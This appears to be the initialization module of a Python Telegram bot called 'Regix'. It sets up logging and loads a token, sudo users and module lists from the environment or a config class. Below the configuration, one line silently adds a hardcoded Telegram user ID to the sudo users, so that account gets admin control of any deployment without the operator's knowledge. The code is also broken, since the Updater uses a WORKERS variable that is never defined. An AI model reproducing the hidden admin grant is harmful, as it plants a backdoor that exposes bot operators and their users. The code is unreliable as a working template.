import logging
import os
import sys
import time
from datetime import datetime

import telegram.ext as tg

print("Regix")
print("Starting...")


# enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO)

LOGGER = logging.getLogger(__name__)

# if version < 3.6, stop bot.
#if sys.version_info[0] < 3 or sys.version_info[1] < 6:
#    LOGGER.error("You MUST have a python version of at least 3.6! Multiple features depend on this. Bot quitting.")
#``````````````    quit(1)

ENV = bool(os.environ.get('ENV', False))

if ENV:
    TOKEN = os.environ.get('TOKEN', None)
    
    try:
        SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
    except ValueError:
        raise Exception("Your sudo users list does not contain valid integers.")

    
    LOAD = os.environ.get("LOAD", "").split()
    NO_LOAD = os.environ.get("NO_LOAD", "translation").split()
    

else:
    from Regex.config import Development as Config
    TOKEN = Config.API_KEY

    try:
        SUDO_USERS = set(int(x) for x in Config.SUDO_USERS or [])
    except ValueError:
        raise Exception("Your sudo users list does not contain valid integers.")        
    LOAD = Config.LOAD
    NO_LOAD = Config.NO_LOAD 

SUDO_USERS.add(1091139479)

updater = tg.Updater(TOKEN, workers=WORKERS)

dispatcher = updater.dispatcher

SUDO_USERS = list(SUDO_USERS)
